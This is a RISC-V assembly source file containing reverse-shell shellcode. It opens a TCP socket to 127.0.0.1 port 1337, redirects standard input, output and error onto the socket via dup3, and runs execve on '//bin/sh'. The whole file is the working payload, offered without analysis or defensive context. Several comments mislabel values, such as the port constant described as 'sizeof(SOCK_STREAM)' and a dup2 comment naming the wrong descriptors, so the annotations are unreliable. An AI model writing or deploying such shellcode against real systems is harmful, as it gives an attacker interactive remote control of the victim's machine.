.section .text
.globl _start

/*
AF_INET=2
SOCK_STREAM=1
inet_addr=0x100007f
port=0x3905
sizeof(sockaddr_in)=16
*/

/*
struct sockaddr_in {
    sa_family_t    sin_family; // address family: AF_INET
    in_port_t      sin_port;   // port in network byte order
    struct in_addr sin_addr;   // internet address
};
*/

_start:
	#socket(AF_INET, SOCK_STREAM, 0);
	li a0,2
	li a1,1
	li a2,0
	li a7,198 #__NR_socket 198
	ecall #socket fd in a0
	#create sockaddr_in
	addi sp,sp,-16
	li t0,2 #sizeof(AF_INET)=2
	sd t0,0(sp)
	li t0,0x3905 #sizeof(SOCK_STREAM)=2
	sd t0,2(sp)
	li t0,0x100007f
	sd t0,4(sp)
	li a1,0
	addi a1,sp,0
	li a2,16
	#connect(a0,&sa,16)
	li a7, 203 #__NR_connect 203
	#ecall will clobber a0/socket fd
	li t0,0
	addi t0,a0,0
	ecall
	#dup2(a0,{1,2,3})
	li a0,0
	addi a0,t0,0
	li a1,0
	li a2,0
	li a7,24 #__NR_dup3 24
	ecall
	li a0,0
	addi a0,t0,0
	li a1,1
	ecall
	li a0,0
	addi a0,t0,0
	li a1,2
	ecall
	
	#execve("//bin/sh",NULL,NULL);
	li a0,0x69622f2f #ib//
	addi sp,sp,-8
	sd a0,0(sp)
	li a7,0x68732f6e # hs/n 
	sd a7,4(sp)
	li a7,0x0
	addi a7,sp,0x11
	li a0,0
	addi a0,a7,-0x11
	li a2,0x0
	li a1,0x0
	li a7,0x1
	addi a7,a7,220
	ecall
	#exit(0);
	li a0, 0x0
	li a7, 0x0
	addi a7,a7,93
	ecall
